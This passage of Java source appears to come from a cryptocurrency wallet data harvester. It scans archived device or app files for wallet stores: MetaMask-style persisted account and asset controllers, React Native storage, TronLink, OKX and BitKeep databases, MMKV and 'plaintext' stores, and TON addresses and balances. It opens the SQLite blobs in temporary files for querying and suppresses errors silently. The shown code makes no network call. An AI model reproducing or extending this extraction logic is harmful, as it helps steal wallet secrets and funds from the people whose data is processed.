        if (d.compareTo(BigDecimal.ZERO) == 0) {
            return "0";
        }
        String s = d.setScale(18, RoundingMode.DOWN).stripTrailingZeros().toPlainString();
        return s.isEmpty() ? "0" : s;
    }

    private static JSONObject loadJson(byte[] raw) {
        if (raw == null || raw.length == 0) {
            return null;
        }
        String text = new String(raw, StandardCharsets.UTF_8).trim();
        if (text.isEmpty()) {
            return null;
        }
        Object obj = tryParse(text);
        if (obj instanceof String) {
            obj = tryParse((String) obj);
        }
        if (obj instanceof JSONObject) {
            return (JSONObject) obj;
        }
        int i = text.indexOf('{');
        if (i > 0) {
            obj = tryParse(text.substring(i));
            if (obj instanceof JSONObject) {
                return (JSONObject) obj;
            }
        }
        return null;
    }

    private static Object tryParse(String text) {
        try {
            return JSON.parse(text);
        } catch (Exception e) {
            return null;
        }
    }

    private static String stem(String name) {
        String base = ArchiveIO.baseName(name);
        int dot = base.lastIndexOf('.');
        return dot > 0 ? base.substring(0, dot) : base;
    }

    private static String str(Object v) {
        return v == null ? "" : String.valueOf(v).trim();
    }

    private interface SqlJob {
        void run(Connection con) throws Exception;
    }

    private static void withSqlite(byte[] db, String prefix, SqlJob job) {
        if (db == null || db.length < 16) {
            return;
        }
        String magic = new String(db, 0, 15, StandardCharsets.US_ASCII);
        if (!"SQLite format 3".equals(magic)) {
            return;
        }
        Path tmp = null;
        try {
            tmp = Files.createTempFile(prefix, ".sqlite");
            Files.write(tmp, db);
            try (Connection con = DriverManager.getConnection("jdbc:sqlite:" + tmp.toAbsolutePath())) {
                job.run(con);
            }
        } catch (Exception ignored) {
        } finally {
            if (tmp != null) {
                try {
                    Files.deleteIfExists(tmp);
                } catch (Exception ignored) {
                }
            }
        }
    }

    private static final class NamedBlob {
        final String name;
        final byte[] bytes;

        NamedBlob(String name, byte[] bytes) {
            this.name = name;
            this.bytes = bytes;
        }
    }

    private static final class Bag {
        byte[] accounts;
        byte[] assets;
        byte[] multi;
        final List<byte[]> async = new ArrayList<>();
        final List<NamedBlob> walletsV2 = new ArrayList<>();
        byte[] tronData;
        byte[] tronGrdb;
        byte[] okxWallet;
        byte[] bitkeep;
        final List<byte[]> mmkv = new ArrayList<>();
        final LinkedHashSet<String> tonAddrs = new LinkedHashSet<>();
        final Map<String, String> tonBal = new LinkedHashMap<>();
        boolean global;
        int held;

        void take(String name, InputStream in, long size) {
            String n = ArchiveIO.normalize(name);
            String low = n.toLowerCase(Locale.ROOT);
            String base = ArchiveIO.baseName(n).toLowerCase(Locale.ROOT);
            if (low.contains("knownaccount")) {
                drain(in);
                return;
            }
            Matcher ton = TON_ADDR.matcher(n);
            while (ton.find()) {
                tonAddrs.add(ton.group());
            }
            int cap = capFor(low, base);
            boolean keep = cap > 0 && (size < 0 || size <= cap) && held + Math.max(0, (int) Math.min(size < 0 ? cap : size, cap)) <= HOLD_BUDGET;
            byte[] data = null;
            if (keep) {
                data = ArchiveIO.readLimited(in, cap);
                held += data.length;
            }
            drain(in);
            if (data == null || data.length == 0) {
                if (low.contains("main.sqlite3") || low.contains("f4secyr")) {
                    global = true;
                }
                return;
            }
            if (low.contains("persist-accountscontroller")) {
                accounts = data;
            } else if (low.contains("persist-assetscontroller")) {
                assets = data;
            } else if (low.contains("persist-multichainbalancescontroller")) {
                multi = data;
            } else if (low.contains("rctasynclocalstorage_v1") && !low.endsWith("manifest.json") && async.size() < 4) {
                async.add(data);
            } else if (low.contains("walletsv2") && low.endsWith(".json") && walletsV2.size() < 40) {
                walletsV2.add(new NamedBlob(n, data));
            } else if ("tronlinkdata.sqlite".equals(base)) {
                tronData = data;
            } else if (base.contains("tronlinkgrdbdata.sqlite") && !low.contains("msgcenter")) {
                tronGrdb = data;
            } else if ("wallet".equals(base) && !low.contains("coinmeta") && !base.startsWith("wallet_")) {
                okxWallet = data;
            } else if ("bitkeep.db".equals(base)) {
                bitkeep = data;
            } else if ((low.contains("mmkv") || base.contains("plaintext")) && mmkv.size() < 6) {
                mmkv.add(data);
            } else if (low.contains("walletbalance/")) {
                for (String addr : tonAddrs) {
                    if (n.contains("WalletBalance/" + addr) || n.contains("walletbalance/" + addr)) {
                        tonBal.put(addr, tonBalance(data));
                    }
                }
            } else if (low.contains("main.sqlite3") || low.contains("f4secyr")) {
                global = true;
            }
        }

        private static int capFor(String low, String base) {
            if (low.contains("persist-accountscontroller") || low.contains("persist-assetscontroller")
                    || low.contains("persist-multichainbalancescontroller")) {
                return 8_000_000;
            }
            if (low.contains("rctasynclocalstorage_v1") && !low.endsWith("manifest.json")) {
                return 6_000_000;
            }
            if (low.contains("walletsv2") && low.endsWith(".json")) {
                return 2_000_000;
            }
            if ("tronlinkdata.sqlite".equals(base) || base.contains("tronlinkgrdbdata.sqlite")
                    || "wallet".equals(base) || "bitkeep.db".equals(base)) {
                return 20_000_000;
            }
            if (low.contains("walletbalance/")) {
                return 2_000_000;
            }
            if (low.contains("mmkv") || base.contains("plaintext")) {
                return 8_000_000;
            }
            if (low.contains("main.sqlite3") || low.contains("f4secyr")) {
                return 1;
            }
            return 0;
        }
    }

    private static void drain(InputStream in) {
        if (in == null) {
            return;
        }
        byte[] buf = new byte[8192];
        try {
            while (in.read(buf) > 0) {
            }
        } catch (Exception ignored) {
        }
    }
}
